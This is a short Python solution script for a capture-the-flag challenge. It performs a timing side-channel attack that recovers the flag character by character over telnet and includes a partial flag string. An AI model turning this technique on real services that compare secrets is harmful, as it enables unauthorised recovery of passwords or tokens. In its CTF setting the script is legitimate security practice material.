import datetime
import telnetlib

SERVER = 'goodtime.ctf.rc3.club'
PORT = '5866'

def time_interval(conn, param):
    start = datetime.datetime.now()
    conn.write(param)
    ret = conn.read_until(b'\n').strip()
    end = datetime.datetime.now()
    interval = end - start
    return interval.total_seconds(), ret


def guess(x):
    conn = telnetlib.Telnet(SERVER, PORT)
    conn.read_until(b': ')
    t, ret = time_interval(conn, x + b'\n')
    print('\rguessing', x.decode('utf8'), t, end='')
    return t, ret
def sidechannel_attack():
    plain_text = b'RC3-2016-itz-alw4yz-a-g00d-t1m'
    halt = False
    while not halt:
        hit = max([(guess(plain_text + bytes([x])), x) for x in range(33, 128)], key=lambda x: x[0][0])
        print('')
        halt = (hit[0][1] != b'Nope')
        plain_text += bytes([hit[1]])
        print(plain_text.decode('utf8'), hit[0][0])

sidechannel_attack()
    
    
